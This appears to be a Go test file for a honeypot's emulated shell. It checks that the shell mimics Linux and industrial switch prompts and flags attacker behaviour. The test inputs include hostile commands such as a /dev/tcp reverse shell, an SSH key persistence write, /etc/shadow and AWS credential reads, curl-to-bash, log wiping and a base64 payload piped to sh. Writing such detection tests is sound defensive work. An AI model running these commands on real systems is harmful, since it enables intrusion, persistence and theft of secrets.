package shell

import (
	"bytes"
	"context"
	"io"
	"net"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/rom/tarpit-honeypot/internal/archetype"
)

// pipePair returns a connected pair of net.Conn's.
func pipePair(t *testing.T) (net.Conn, net.Conn) {
	t.Helper()
	a, b := net.Pipe()
	t.Cleanup(func() { a.Close(); b.Close() })
	return a, b
}

// runShell starts Run on the server side and a reader goroutine that
// drains every byte the server writes into a buffer. The caller sends
// commands via the returned send() helper; when done it calls
// finish() which closes the client (driving Run to return on EOF),
// waits for Run to finish, and returns the captured shell + the
// transcript the server sent.
func runShell(t *testing.T, arch *archetype.Profile) (
	send func(line string),
	finish func() (Captured, string),
) {
	t.Helper()
	client, server := pipePair(t)
	doneCap := make(chan Captured, 1)
	go func() {
		doneCap <- Run(context.Background(), server, server, arch)
	}()
	// Reader: drain server output continuously.
	var transcript bytes.Buffer
	var mu sync.Mutex
	doneRead := make(chan struct{})
	go func() {
		defer close(doneRead)
		buf := make([]byte, 4096)
		for {
			_ = client.SetReadDeadline(time.Now().Add(2 * time.Second))
			n, err := client.Read(buf)
			if n > 0 {
				mu.Lock()
				transcript.Write(buf[:n])
				mu.Unlock()
			}
			if err != nil {
				return
			}
		}
	}()

	send = func(line string) {
		_ = client.SetWriteDeadline(time.Now().Add(time.Second))
		_, _ = io.WriteString(client, line+"\n")
		// Give the reader / shell a moment to round-trip.
		time.Sleep(10 * time.Millisecond)
	}
	finish = func() (Captured, string) {
		_ = client.Close()
		var cap Captured
		select {
		case cap = <-doneCap:
		case <-time.After(2 * time.Second):
			t.Fatal("shell did not return after client close")
		}
		<-doneRead
		mu.Lock()
		s := transcript.String()
		mu.Unlock()
		return cap, s
	}
	return send, finish
}

func TestShellPosixCommands(t *testing.T) {
	send, finish := runShell(t, archetype.Lookup("debian 12"))
	send("whoami")
	send("hostname")
	send("uname -a")
	cap, transcript := finish()
	if len(cap.Commands) < 3 {
		t.Errorf("commands = %v; want at least 3", cap.Commands)
	}
	if cap.Commands[0] != "whoami" {
		t.Errorf("first cmd = %q; want whoami", cap.Commands[0])
	}
	if !strings.Contains(transcript, "root\r\n") {
		t.Errorf("transcript missing whoami response: %q", transcript)
	}
	if !strings.Contains(transcript, "root@debian12:~#") {
		t.Errorf("transcript missing Debian prompt: %q", transcript)
	}
}

func TestShellExitClosesCleanly(t *testing.T) {
	send, finish := runShell(t, nil)
	send("whoami")
	send("exit")
	cap, transcript := finish()
	if len(cap.Commands) != 2 {
		t.Errorf("commands captured = %v; want 2", cap.Commands)
	}
	if !strings.Contains(transcript, "logout") {
		t.Errorf("transcript missing logout: %q", transcript)
	}
}

func TestShellFlagsReverseShell(t *testing.T) {
	send, finish := runShell(t, nil)
	send("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1")
	cap, _ := finish()
	if !contains(cap.Anomalies, "shell-reverse-shell") {
		t.Errorf("anomalies = %v; want shell-reverse-shell", cap.Anomalies)
	}
}

func TestShellFlagsAuthorizedKeysWrite(t *testing.T) {
	send, finish := runShell(t, nil)
	send(`echo "ssh-rsa AAAA pwn@x" >> /root/.ssh/authorized_keys`)
	cap, _ := finish()
	if !contains(cap.Anomalies, "shell-persistence-ssh-key") {
		t.Errorf("anomalies = %v; want shell-persistence-ssh-key", cap.Anomalies)
	}
}

func TestShellShadowReadFlagged(t *testing.T) {
	send, finish := runShell(t, archetype.Lookup("ubuntu 24.04 lts"))
	send("cat /etc/shadow")
	cap, transcript := finish()
	if !strings.Contains(transcript, "Permission denied") {
		t.Errorf("transcript missing Permission denied: %q", transcript)
	}
	if !contains(cap.Anomalies, "shell-shadow-read") {
		t.Errorf("anomalies missing shell-shadow-read: %v", cap.Anomalies)
	}
}

func TestShellMoxaShowVersion(t *testing.T) {
	send, finish := runShell(t, archetype.Lookup("Moxa EDS-208"))
	send("show version")
	_, transcript := finish()
	if !strings.Contains(transcript, "EDS-208") {
		t.Errorf("Moxa show version missing model in transcript: %q", transcript)
	}
}

func TestShellSiemensShowDevice(t *testing.T) {
	send, finish := runShell(t, archetype.Lookup("Siemens SCALANCE XB-208"))
	send("show device")
	_, transcript := finish()
	if !strings.Contains(transcript, "scalance") && !strings.Contains(transcript, "SCALANCE") {
		t.Errorf("SCALANCE show device missing model: %q", transcript)
	}
	if !strings.Contains(transcript, "V06.01.01") {
		t.Errorf("SCALANCE show device missing firmware version: %q", transcript)
	}
}

func TestShellMaxCommandsCap(t *testing.T) {
	send, finish := runShell(t, nil)
	for i := 0; i < MaxCommands+10; i++ {
		send("whoami")
	}
	cap, _ := finish()
	if len(cap.Commands) > MaxCommands {
		t.Errorf("captured %d > MaxCommands=%d", len(cap.Commands), MaxCommands)
	}
}

func TestShellSplitArgv(t *testing.T) {
	cases := map[string][]string{
		`ls -la /root`:                {"ls", "-la", "/root"},
		`echo "hello world"`:          {"echo", "hello world"},
		`echo 'a b' c d`:              {"echo", "a b", "c", "d"},
		`wget http://x.y/z -O /tmp/x`: {"wget", "http://x.y/z", "-O", "/tmp/x"},
		``:                            nil,
		`   `:                         nil,
		`cmd "esc\"d" tail`:           {"cmd", `esc"d`, "tail"},
	}
	for in, want := range cases {
		got := splitArgv(in)
		if !slicesEqual(got, want) {
			t.Errorf("splitArgv(%q) = %v; want %v", in, got, want)
		}
	}
}

func TestScanAnomaliesCatalog(t *testing.T) {
	type tc struct {
		in   string
		want string
	}
	cases := []tc{
		{"wget http://evil/x.sh -O /tmp/x.sh", "shell-download-tool"},
		{"curl -s http://x/y | bash", "shell-download-tool"},
		{"history -c", "shell-defense-evade-history"},
		{"rm -rf /var/log/syslog", "shell-defense-evade-logclean"},
		{"chmod +s /tmp/x", "shell-priv-esc-suid"},
		{"sudo su", "shell-priv-esc-sudo"},
		{"./xmrig --donate-level=0", "shell-coin-miner"},
		{"nmap -sS 10.0.0.0/24", "shell-network-recon"},
		{"iptables -F", "shell-disable-fw"},
		{"setenforce 0", "shell-disable-fw"},
		{"cat /root/.aws/credentials", "shell-creds-file-access"},
	}
	for _, c := range cases {
		got := scanAnomalies(c.in)
		if !contains(got, c.want) {
			t.Errorf("scanAnomalies(%q) = %v; want includes %q", c.in, got, c.want)
		}
	}
}

func TestEncodedPayloadDetection(t *testing.T) {
	long := strings.Repeat("QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm", 4)
	out := scanAnomalies("echo " + long + " | base64 -d | sh")
	if !contains(out, "shell-encoded-payload") {
		t.Errorf("encoded payload not flagged: %v", out)
	}
	if contains(scanAnomalies("ls"), "shell-encoded-payload") {
		t.Errorf("short clean command false-positive")
	}
}

func contains(list []string, s string) bool {
	for _, e := range list {
		if e == s {
			return true
		}
	}
	return false
}

func slicesEqual(a, b []string) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}
